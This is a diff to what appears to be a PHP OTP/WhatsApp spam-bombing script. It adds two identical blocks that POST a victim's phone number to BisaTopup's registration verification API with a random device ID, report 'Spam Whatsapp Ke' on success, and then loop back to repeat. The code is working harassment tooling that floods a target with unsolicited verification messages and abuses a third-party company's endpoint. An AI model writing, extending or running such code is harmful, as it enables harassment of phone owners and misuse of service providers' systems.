@@ -1124,6 +1124,54 @@ else{
 
 
 
+//BISATOPUP
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api-mobile.bisatopup.co.id/register/send-verification?type=WA&device_id='.codex(16).'&version_name=6.12.04&version=61204',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'phone_number='.$nomor,
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type: application/x-www-form-urlencoded'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"message":"','","');
+if ($result == 'OTP akan segera dikirim ke perangkat') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " BISATOPUP ".$response."\n";
+}
+
+
+
+//BISATOPUP
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api-mobile.bisatopup.co.id/register/send-verification?type=WA&device_id='.codex(16).'&version_name=6.12.04&version=61204',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'phone_number='.$nomor,
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type: application/x-www-form-urlencoded'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"message":"','","');
+if ($result == 'OTP akan segera dikirim ke perangkat') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " BISATOPUP ".$response."\n";
+}
+
+
+
 echo color("yellow"," Done Sensei..\n");
 sleep(3);
 goto lagi;
